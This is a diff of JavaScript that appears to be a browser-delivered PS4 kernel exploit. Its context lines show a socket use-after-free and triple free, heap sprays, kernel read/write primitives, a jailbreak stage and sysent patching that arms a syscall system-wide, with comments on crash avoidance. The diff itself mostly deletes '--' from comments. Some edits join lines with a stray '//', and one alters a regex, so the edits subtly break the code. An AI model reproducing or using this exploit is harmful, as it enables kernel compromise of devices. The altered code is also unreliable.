@@ -25,7 +25,7 @@ function post(tag, detail) {
 
 const VERBOSE = params.get("verbose") === "1";
 const PROSE = [
-    / -- /, /\.\s/, /;\s/,
+    / /, /\.\s/, /;\s/,
     /,\s+(which|so|and that|because|since|as that)\s/,
     /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
     /\s+so\s+[a-z]/,
@@ -177,8 +177,7 @@ let allDone = false;
             onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                 (t, (a != null ? "[" + a + "] " : "") + (d || ""))
         });
-        // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
-        // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
+        // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
         // only NULLS references; it does not free anything. It converts 137 MB
         // of quiet pinned memory into 137 MB of garbage and leaves the sweep to
         // JSC, which last time chose to run it somewhere inside the triple-free
@@ -186,7 +185,7 @@ let allDone = false;
         //
         // So: release it HERE, then make the collection happen HERE too, before
         // a single worker or kernel object exists.
-        // OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
+        // OPT-IN, not opt-out. Promotion releases the ~137 MB but releasing
         // is not freeing: it turns quiet pinned memory into garbage that JSC
         // collects whenever it chooses, including mid-race. The sweep below was
         // meant to force that collection at a safe point and MEASURABLY DOES
@@ -216,7 +215,7 @@ let allDone = false;
 
         // Provoke the collection. globalThis.gc does not exist in a shipping
         // WebProcess (core.js:368 guards for it and never fires), so the only
-        // levers are allocation pressure and turning the event loop -- the
+        // levers are allocation pressure and turning the event loop the
         // incremental sweeper cannot run while we hold the thread.
         //
         // OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
@@ -406,7 +405,7 @@ let allDone = false;
         // every reader below then parses whatever the PREVIOUS call left in the
         // buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
         // requested window keeps this proportional to the copy already being
-        // made -- this runs inside the spray loops.
+        // made this runs inside the spray loops.
         const leakU8 = new Uint8Array(leakAb);
         const R2_ON = params.get("r2") !== "0";
         let shortReads = 0;
@@ -417,7 +416,7 @@ let allDone = false;
         // free-then-realloc, so re-spraying a burned socket FREES the aliased
         // chunk and leaves the other owner dangling. freeRthdr and close are
         // equally fatal. A burned fd is therefore excluded from every spray,
-        // every scan, and the teardown close -- until kernel R/W can repair it.
+        // every scan, and the teardown close until kernel R/W can repair it.
         const burned = new Set();
         function burn(fd, why) {
             if (fd > 0 && !burned.has(fd)) {
@@ -450,7 +449,7 @@ let allDone = false;
 
         // `need` = the highest byte offset the CALLER will actually parse. A
         // copyout shorter than that is reported as -1 rather than handing back
-        // the previous call's bytes. No mark() here -- this is a hot path; the
+        // the previous call's bytes. No mark() here this is a hot path; the
         // count is reported once at make_karw.
         function getRthdr(s, size, need) {
             if (R2_ON) leakU8.fill(0xee, 0, size);
@@ -616,7 +615,7 @@ let allDone = false;
 
             // MAIN THREAD FIRST. attrsRestored is latched at the top of this
             // function, so a death anywhere below leaves main realtime-256 on
-            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
+            // MAIN_CORE AND makes the finally's retry a permanent no-op the
             // console then refuses to power off. The 16 worker RPCs used to run
             // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
             // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
@@ -797,7 +796,7 @@ let allDone = false;
             mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
-            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
+            state("REBOOT FIRST this kernel is still poisoned", "bad");
             mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -806,8 +805,7 @@ let allDone = false;
 
         let twins = null, triplets = null;
 
-        // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
-        // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
+        // ITEM 6(d). `committed` means "kernel state irreversibly touched" // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
         // whether an alias exists that we could NOT contain. poops.js:4356
         // refuses on that condition, not on "we already fired".
         let uncontained = null;
@@ -863,7 +861,7 @@ let allDone = false;
             twins = findTwins(MAX_ROUNDS_TWIN);
             if (!twins) {
                 // No socket showed a duplicate tag: either the double free did
-                // not take, or it did and the scan missed it -- indistinguishable
+                // not take, or it did and the scan missed it indistinguishable
                 // from here (poops.js:4443 says the same). Nothing is KNOWN to be
                 // aliased, so there is nothing to burn. Drop the spent fd, retry.
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
@@ -963,7 +961,7 @@ let allDone = false;
             } else {
                 // A triple free happened and we could not name all three owners,
                 // so we cannot burn what we cannot identify. This is the one path
-                // that must NOT retry -- poops.js:4356 refuses here too.
+                // that must NOT retry poops.js:4356 refuses here too.
                 mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                 burn(t0, "triplet-miss");
                 if (t1) burn(t1, "triplet-miss");
@@ -1165,7 +1163,7 @@ let allDone = false;
         }
 
         // ITEM 3. tripletsUsable() only checks the three fds are non-zero and
-        // in the pool -- it never reads a single one back. Every getRthdr in
+        // in the pool it never reads a single one back. Every getRthdr in
         // the race path targets the MASTER only, so a slave that is no longer
         // aliased is indistinguishable from one that is, and we then spend a
         // full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
@@ -1220,8 +1218,8 @@ let allDone = false;
             try {
                 if (wakeUio && utasks && utasks[0]) {
                     // THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
-                    // uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
-                    // no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
+                    // uioSs is a blocking AF_UNIX socketpair no O_NONBLOCK,
+                    // no SO_RCVTIMEO and sc() is a synchronous syscall on the
                     // main JS thread, so one read past the available bytes parks
                     // the WebProcess forever and the console has to be pulled.
                     //
@@ -1232,8 +1230,7 @@ let allDone = false;
                     // (landUio re-primes at its round tail) and NOTHING on the
                     // write side (forWrite skips that prime, and its racers are
                     // readv()-ers). So: one read, or none. Never N+1.
-                    // The old code asked for (N+1)*8 and hung just as hard --
-                    // it only ever survived because this path is rare.
+                    // The old code asked for (N+1)*8 and hung just as hard // it only ever survived because this path is rare.
                     const dsz = size || 8;
                     for (let k = 0; k < (drainReads || 0); ++k)
                         sc(SYS.read, uioSs[0], scratch, dsz);
@@ -1256,7 +1253,7 @@ let allDone = false;
         // slots 1..19 are in-bounds and inert unless populated here.
         // ITEM 2. Refuse to spend a slow op on an address that cannot be a
         // kernel pointer. Without this, a kread that returned all zeros gave
-        // int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
+        // int64(0,0) which is TRUTHY so the walk carried on and issued a
         // read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
         // kernel dereference. poops.js:4800-4807 gates the same way.
         const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
@@ -1363,7 +1360,7 @@ let allDone = false;
         }
 
         // R1. This read proves nothing the pipe primitive does not prove better,
-        // and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
+        // and it is slow op #1 of 7 one full UAF re-roll at ~3.1% death for a
         // check that is repeated at :kernelview-reads-kernel-elf-header on the
         // FAST primitive, before the first kernel write. poops.js:8672 runs its
         // ELF proof on kread64Fast for exactly this reason, and poops.js:6063
@@ -1410,7 +1407,7 @@ let allDone = false;
                 }
                 return false;
             }
-            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
+            // R3/R4 helpers. Same retry discipline as kread8 do NOT drop it.
             const qw = (dv, o) => new int64(dv.getUint32(o, true),
                                             dv.getUint32(o + 4, true));
             async function kreadN(a, n) {
@@ -1446,7 +1443,7 @@ let allDone = false;
             // R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
             // span, so one 0x20 read replaces two windows. pipe() at :387/:389
             // are back-to-back with no intervening fd allocation, so the two
-            // low fds are always 2 apart -- 44/44 in the log. Verified, not
+            // low fds are always 2 apart 44/44 in the log. Verified, not
             // assumed, and it falls back if the console ever disagrees.
             let mFp = null, sFp = null;
             const fdDelta = slavePipe[0] - masterPipe[0];
@@ -1471,7 +1468,7 @@ let allDone = false;
                 + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));
 
             // R4. f_data of the two struct files: unrelated addresses, so a
-            // contiguous read cannot help -- this needs the scatter.
+            // contiguous read cannot help this needs the scatter.
             let mData = null, sData = null;
             if (R4_ON && mFp && sFp) {
                 const both = await kreadPairs([{ addr: mFp, size: 8 },
@@ -1570,16 +1567,16 @@ let allDone = false;
                     if (!kvElfOk || !kvAgree) {
                         // REPORT ONLY. Do NOT null kv and do NOT skip what
                         // follows. By this point the pipebuf forge has already
-                        // been committed, and the code below -- nulling the
+                        // been committed, and the code below nulling the
                         // triplets' ip6po_rthdr and removing the aliased struct
-                        // file -- is exactly what lets the process exit without
+                        // file is exactly what lets the process exit without
                         // panicking the kernel. Gating it on a failed view
                         // turns a run that would have finished dirty-but-alive
                         // into a guaranteed panic at exit. Four independent
                         // reviewers caught this; it was my mistake.
                         mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                             + " agree=" + (kvAgree ? 1 : 0)
-                            + " -- repair still runs, later stages self-gate");
+                            + " repair still runs, later stages self-gate");
                     }
 
                     const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
@@ -1660,8 +1657,7 @@ let allDone = false;
                     let jailbreakThrew = null;
                     // Declared OUT here: the kernel patcher and the
                     // payload stage read both, and a let inside the try
-                    // below would be block-scoped away from them --
-                    // a runtime ReferenceError node --check cannot see.
+                    // below would be block-scoped away from them // a runtime ReferenceError node check cannot see.
                     let jailbroken = false, curproc = null;
                     try {
                         const FIOSETOWN = 0x8004667c;
@@ -1739,7 +1735,7 @@ let allDone = false;
                     } catch (e) {
                         jailbreakThrew = e && e.message ? e.message : "" + e;
                         mark("JAILBREAK-THREW", jailbreakThrew
-                            + " -- continuing to cleanup");
+                            + " continuing to cleanup");
                     }
 
 
@@ -1756,7 +1752,7 @@ let allDone = false;
                         // single write that decides whether the process can exit
                         // without panicking, and until now nothing anywhere in
                         // the chain has ever confirmed that a kv write actually
-                        // lands -- the check below reported "nulled" purely
+                        // lands the check below reported "nulled" purely
                         // because the four reads above looked pointer-shaped.
                         // poops.js:7123-7128 reads back the same way.
                         const was = kview(opts).getBInt(0x68);
@@ -1775,7 +1771,7 @@ let allDone = false;
                         mark("TRIPLET-RTHDR", res.join(" "));
                         // "already0" is a success: the field was already clear,
                         // so there is nothing to repair. Only a failed WRITE or
-                        // a bad walk is a failure -- and unlike before, this now
+                        // a bad walk is a failure and unlike before, this now
                         // reflects a verified read-back rather than the shape of
                         // the pointers we walked to get here.
                         check("triplet-ip6po_rthdr-nulled",
@@ -1787,8 +1783,8 @@ let allDone = false;
                     // ITEM 6(c). The half that makes the retry safe. Every socket
                     // burned during a failed attempt still has an rthdr pointing
                     // at a freed ucred; closing it would free that chunk again.
-                    // Now that kernel R/W exists, null the pointer -- verified by
-                    // read-back -- and only then let it out of the burn list.
+                    // Now that kernel R/W exists, null the pointer verified by
+                    // read-back and only then let it out of the burn list.
                     // Anything that will not repair STAYS burned and stays open.
                     if (burned.size) {
                         const bres = [], cleared = [];
@@ -1813,16 +1809,16 @@ let allDone = false;
                         const r = fhold(uafFp);
 
                         // THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
-                        // 2048 x fget(), and every fget minted TWO int64 -- and
+                        // 2048 x fget(), and every fget minted TWO int64 and
                         // int64.js gives each instance its own seven closures
-                        // (int64.js:19-93), so 8 GC cells apiece -- plus a
+                        // (int64.js:19-93), so 8 GC cells apiece plus a
                         // per-call Uint8Array inside kv.read8, plus two pipe
                         // syscalls. 34,816 objects and 4,096 syscalls in one
                         // unbroken synchronous stretch, at the point the heap is
                         // most loaded, with no yield anywhere in it. JSC's
                         // sweeper only runs when the event loop turns, so all of
                         // that garbage sat unswept until the await immediately
-                        // after SOCKETS-CLOSED -- which is exactly where the
+                        // after SOCKETS-CLOSED which is exactly where the
                         // process was being killed.
                         //
                         // Same range, same comparisons, same writes. The ofiles
@@ -1835,14 +1831,14 @@ let allDone = false;
                         // proving the ofiles array is that big. If the table is
                         // smaller, the bulk read walks past the allocation and
                         // any 8 bytes out there that happen to equal uafFp get
-                        // ZEROED by the fput below -- an out-of-bounds kernel
+                        // ZEROED by the fput below an out-of-bounds kernel
                         // write whose damage surfaces at the NEXT allocation,
                         // which is exactly the window where 22% of the runs
                         // reaching here died. POOPS.LUA:1219 scans only 0..255;
                         // we were eight times wider with no bound at all.
                         //
                         // Bound it by the highest fd we can PROVE is open,
-                        // because we are holding it -- the table must have at
+                        // because we are holding it the table must have at
                         // least that many entries, and FreeBSD never shrinks it
                         // on close. No fd_nfiles offset to get wrong. The
                         // highest alias ever observed across 71 logged runs is
@@ -1860,7 +1856,7 @@ let allDone = false;
                         // CLAMPED, and it has to be. This value is the loop
                         // INCREMENT at the bottom of this block, not a bound, so
                         // unlike every other knob in this file a bad value does
-                        // not degrade to "do nothing" -- it never terminates.
+                        // not degrade to "do nothing" it never terminates.
                         // parseInt("0x200", 10) is 0 (it stops at the x), and
                         // 0x200 is exactly how the default is spelled right
                         // here, so that is the value someone is most likely to
@@ -1871,7 +1867,7 @@ let allDone = false;
                         // Upper bound: CHUNK_BYTES must stay strictly under
                         // PIPE_PAGE, or pipe_read wraps its buffer and hands
                         // back DUPLICATED data that still passes the
-                        // rv === CHUNK_BYTES check -- which would make fput()
+                        // rv === CHUNK_BYTES check which would make fput()
                         // write zeros far past the end of the fd table.
                         const CHUNK_FDS = (function () {
                             const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
@@ -1896,7 +1892,7 @@ let allDone = false;
                             // Clamp the LAST chunk. SCAN_MAX is now a measured
                             // bound, not a round number, so a fixed-size read
                             // here would walk past the table on the final chunk
-                            // -- reintroducing the exact out-of-bounds this
+                            // reintroducing the exact out-of-bounds this
                             // bound exists to prevent.
                             const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                             const nBytes = nFds * FILEDESCENT_SIZE;
@@ -1916,7 +1912,7 @@ let allDone = false;
                                 }
                             } else {
                                 // Short read: redo THIS CHUNK the original way.
-                                // Never skip one -- a missed alias leaves the
+                                // Never skip one a missed alias leaves the
                                 // console dirty and costs a reboot, which is far
                                 // worse than the allocation we are avoiding.
                                 slowChunks++;
@@ -1940,8 +1936,8 @@ let allDone = false;
                         // MEASURED, not assumed. A 256-allocation probe returned
                         // the SAME struct file at three consecutive fds
                         // (364,365,366): the chunk is linked into the Files zone
-                        // free list THREE times -- freed 3x (CLEAR_QUEUE and two
-                        // dup+close) but allocated once -- so falloc hands the
+                        // free list THREE times freed 3x (CLEAR_QUEUE and two
+                        // dup+close) but allocated once so falloc hands the
                         // identical object to three independent owners. The first
                         // to close it frees it; the other two dangle. That is the
                         // panic minutes after an idle run.
@@ -1951,7 +1947,7 @@ let allDone = false;
                         // allocating until they surface (~1032 deep, stride 0x68).
                         //
                         // NULL the slot; do NOT leak the fd. f_count reads 1, not
-                        // 3 -- each falloc resets it -- so three descriptors point
+                        // 3 each falloc resets it so three descriptors point
                         // at an object whose refcount says one, and leaking them
                         // only moves the panic to fdescfree at process exit.
                         // Nulling means nothing references it and it is orphaned
@@ -2093,7 +2089,7 @@ let allDone = false;
                         // `nulled > 0` only ever proved the LIVE FD TABLE was
                         // tidy. It is structurally blind to a free-list entry,
                         // and every "clean" run we celebrated was reporting on
-                        // that blind evidence -- which is why the console kept
+                        // that blind evidence which is why the console kept
                         // panicking minutes later. A run is clean only if the fd
                         // table was repaired AND the zone drain removed every
                         // duplicate AND fresh allocations no longer see it.
@@ -2192,8 +2188,7 @@ let allDone = false;
                                         // a jmp [rsi] gadget SYSTEM-WIDE. If
                                         // anything between here and the restore
                                         // throws, every process on the console is
-                                        // left with a weaponised syscall 661 --
-                                        // and the outer finally does not cover
+                                        // left with a weaponised syscall 661 // and the outer finally does not cover
                                         // this, because it is nested inside the
                                         // KernelView block. Restore in a finally.
                                         let rc = -1;
@@ -2208,7 +2203,7 @@ let allDone = false;
                                             if (!back) mark("SYSENT-NOT-RESTORED",
                                                 "sy_call still " +
                                                 kview(sysent).getBInt(SYSENT_CALL)
-                                                + " -- syscall 661 is armed system-wide");
+                                                + " syscall 661 is armed system-wide");
                                         }
                                         const verify = [];
                                         let allEb = true;
@@ -2309,14 +2304,14 @@ let allDone = false;
         }
 
         state(allDone ? "تم تهكير الجهاز بنجاح "
-              : kv ? "KERNEL R/W -- REBOOT NEEDED"
-              : kernelBase ? "FAILED IN make_karw -- REBOOT"
-              : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
+              : kv ? "KERNEL R/W REBOOT NEEDED"
+              : kernelBase ? "FAILED IN make_karw REBOOT"
+              : triplets ? "FAILED IN leak_kqueue (triple free was OK) REBOOT"
               : committed ? "FAILED PLEASE REBOOT PS4 فشل في تهكير الجهاز يرجى إعادة تشغيل الجهاز "
               : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
-        state("FAILED -- see log", "bad");
+        state("FAILED see log", "bad");
     } finally {
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
